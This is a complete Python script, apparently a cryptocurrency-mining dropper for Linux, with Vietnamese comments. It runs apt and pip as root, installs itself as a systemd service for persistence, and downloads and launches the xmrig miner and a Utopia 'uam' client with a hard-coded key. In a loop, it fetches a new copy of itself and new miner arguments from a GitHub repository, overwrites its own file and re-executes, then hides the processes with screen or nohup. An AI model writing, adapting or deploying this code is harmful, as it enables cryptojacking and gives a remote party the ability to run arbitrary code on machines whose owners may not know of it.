try:
    import os
    import sys
    from sys import platform
    import requests
    import time
    import subprocess
    #import multiprocessing
except:
    pass

if platform == "linux" or platform == "linux2":
    operate_system = 'lin'
elif platform == "darwin":
    operate_system = 'OS X'
elif platform == "win32":
    operate_system = 'win'

timeout = 30
thoi_gian_nghi = 28800
if operate_system == 'lin':
    try:
        os.system('apt-get update -y')
        #os.system ('apt --fix-broken install -y')
        os.system('apt-get install -y screen')
        os.system('pip install psutil')
        os.system('pip3 install psutil')
    except:
        pass
import psutil

command_xmrig_default = '-c /opt/xmrig_linux/config.json'
while True:
    working_dir = os.path.dirname(os.path.realpath(__file__))
    print(working_dir)
    path_app = os.path.realpath(__file__)
    version_chinh = 4.0
    link_version_chinh = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_chinh'
    link_dao = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/dao.py'
    try:
        response = requests.get(link_version_chinh, timeout=timeout)
        get_version_chinh = float(response.text)
        print(get_version_chinh)
        if get_version_chinh == version_chinh:
            print('Dang o version moi nhat la %s' % version_chinh)
        else:
            if len(response.text) < 5:
                print('Co version moi, update thoi')
                response = requests.get(link_dao, timeout=timeout)
                data_trave = response.text
                print(data_trave)
                fileopen = open(path_app, 'w+')
                fileopen.write(data_trave)
                fileopen.close()
                os.system('python3 %s' % path_app)
                sys.exit()
    except:
        pass
    
    if operate_system == 'lin':
        try:
            path_service = '/lib/systemd/system/dao.service'
            data = '[Unit]\nDescription=dao service\n[Service]\nType=simple\nExecStart=/usr/bin/python3 %s\n[Install]\nWantedBy=multi-user.target' % path_app
            if not os.path.exists(path_service):
                fileopen = open(path_service, 'w+')
                fileopen.write(data + '\n')
                fileopen.close()
            #os.system('chmod 600 %s' %path)
                os.system('systemctl daemon-reload')
                os.system('systemctl enable dao')
        except:
            pass
    #utopia
    if operate_system == 'lin':
        
        link_version_uam = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_uam'
        link_download_uam = 'https://github.com/giautoidi/giautoidi/raw/beta/vietlai/uam-latest_amd64.deb'
        install_deb_name = 'uam-latest_amd64.deb'
        folder_uam = 'uam'
        uam_name = 'uam'
        try:
            if not os.path.isfile('/opt/%s/%s' %(folder_uam, uam_name)):
                print('Chua co chuong trinh %s' %uam_name)
                os.chdir('/tmp')
                os.system('rm -f /tmp/%s' % install_deb_name)
                os.system('wget %s' % link_download_uam)
                try:
                    #os.system ('dpkg -i %s' % install_deb_name)
                    os.system ('apt install /tmp/%s' % install_deb_name)
                except:
                    pass
            else:
                print('Da co chuong trinh %s' % uam_name)
        except:
            pass
        try:
            command = '/opt/%s/%s --version' % (folder_uam, uam_name)
            output = subprocess.check_output(command, shell=True).decode('utf-8')
            #print(output)
            version_tam = output.split('version')
            version_uam = version_tam[1].strip()
            print('Version uam la %s' %version_uam)
            response = requests.get(link_version_uam, timeout=timeout)
            get_version_uam = response.text.strip()
            print('Version uam lay tren web la %s' %get_version_uam)
            #Check version uam
            if get_version_uam == version_uam and len(get_version_uam) < 20:
                print('Uam dang o phien ban moi nhat %s' %get_version_uam)
            else:
                if len(get_version_uam) < 20:
                    os.system('pkill uam')
                    print('uam da co phien ban moi, tien hanh updat thoi')
                    os.chdir('/tmp')
                    os.system('rm -f /tmp/%s' % install_deb_name)
                    os.system('wget %s' % link_download_uam)
                    try:
                        os.system ('apt install /tmp/%s' % install_deb_name)
                    except:
                        pass
        except:
            pass    
        try:
            uam_dachay = False
            for proc in psutil.process_iter():
                process_name = proc.as_dict(attrs=['pid', 'name', 'create_time'])
                #print(process_name['name'])
                if uam_name == process_name['name']:
                    print('Da co chuong trinh %s chay' %uam_name)
                    uam_dachay = True
                    break
        except:
            pass
        try:
            if uam_dachay == False:
                command = '/opt/%s/%s --pk F32978292823F8829CDC31E42364865D1CAEC2FB847BC9DBB27EF29BCEF6F906' %(folder_uam, uam_name)
                if os.path.isfile('/usr/bin/screen'):
                    print('Co chuong trinh screen')
                    os.system ('screen -dmS %s %s' %(uam_name, command))
                elif os.path.isfile('/usr/bin/nohup'):
                    print('Co chuong trinh nohup')
                    os.system ('nohup %s &' %command)
                else:
                    os.system ('%s &' %command)
        except:
            pass
        #xmrig
        #cores_cpu = multiprocessing.cpu_count()
        #cores_tru = int(round(cores_cpu*40/100+0.9))
        #cores = cores_cpu - cores_tru
        #print('So cores de dao la %s' %cores)
        link_version_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/version_xmrig'
        link_download_xmrig = 'https://github.com/giautoidi/giautoidi/raw/beta/vietlai/xmrig_linux.gz'
        link_command_xmrig = 'https://raw.githubusercontent.com/giautoidi/giautoidi/beta/vietlai/command_xmrig'
        gz_name = 'xmrig_linux.gz'
        folder_xmrig = 'xmrig_linux'
        xmrig_name = 'xmrig'
        try:
            if not os.path.isfile('/opt/%s/%s' %(folder_xmrig, xmrig_name)):
                print('Chua co chuong trinh %s' %xmrig_name)
                os.chdir('/opt')
                os.system('rm -f /opt/%s' %gz_name)
                os.system('wget %s' %link_download_xmrig)
                os.system('tar xf %s' %gz_name)
                os.chdir('/opt/%s' %folder_xmrig)
                #workingdir = os.getcwd()
                os.system('chmod 777 %s' %xmrig_name)
            else:
                print('Da co chuong trinh %s' %xmrig_name)
        except:
            pass
        try:
            command = '/opt/%s/%s --version' % (folder_xmrig, xmrig_name)
            output = subprocess.check_output(command, shell=True).decode('utf-8')
            #print(output)
            #time.sleep(10000)
            version_tam = output.split(' ')
            version_xmrig = version_tam[1].strip()
            print('Version xmrig la %s' %version_xmrig)
            response = requests.get(link_version_xmrig, timeout=timeout)
            get_version_xmrig = response.text.strip()
            print('Version xmrig lay tren web la %s' %get_version_xmrig)
            #Check version uam
            if get_version_xmrig == version_xmrig and len(get_version_xmrig) < 20:
                print('xmrig dang o phien ban moi nhat %s' %version_xmrig)
            else:
                if len(get_version_xmrig) < 20:
                    os.system('pkill xmrig')
                    print('xmrig da co phien ban moi, tien hanh update thoi')
                    os.chdir('/opt')
                    os.system('rm -f /opt/%s' %gz_name)
                    os.system('rm -rf /opt/%s' %folder_xmrig)
                    os.system('wget %s' %link_download_xmrig)
                    os.system('tar xf %s' %gz_name)
        except:
            pass

        try:
            response = requests.get(link_command_xmrig, timeout=timeout)
            command_xmrig_download = response.text.strip()
            print(command_xmrig_download)
            if command_xmrig_download != command_xmrig_default:
                command_xmrig_default = command_xmrig_download
                #print(command_xmrig_download)
                os.system('pkill xmrig')
        except:
            pass
        try:
            xmrig_dachay = False
            for proc in psutil.process_iter():
                process_name = proc.as_dict(attrs=['pid', 'name', 'create_time'])
                #print(process_name['name'])
                if xmrig_name == process_name['name']:
                    print('Da co chuong trinh %s chay' %xmrig_name)
                    xmrig_dachay = True
                    break
        except:
            pass
        if xmrig_dachay == False:
            command = '/opt/%s/%s %s' %(folder_xmrig, xmrig_name, command_xmrig_default)
            print(command)
            if os.path.isfile('/usr/bin/screen'):
                print('Co chuong trinh screen')
                os.system ('screen -dmS %s %s' %(xmrig_name, command))
            elif os.path.isfile('/usr/bin/nohup'):
                print('Co chuong trinh nohup')
                os.system ('nohup %s &' %command)
            else:
                os.system ('%s &' %command)
        time.sleep(thoi_gian_nghi)

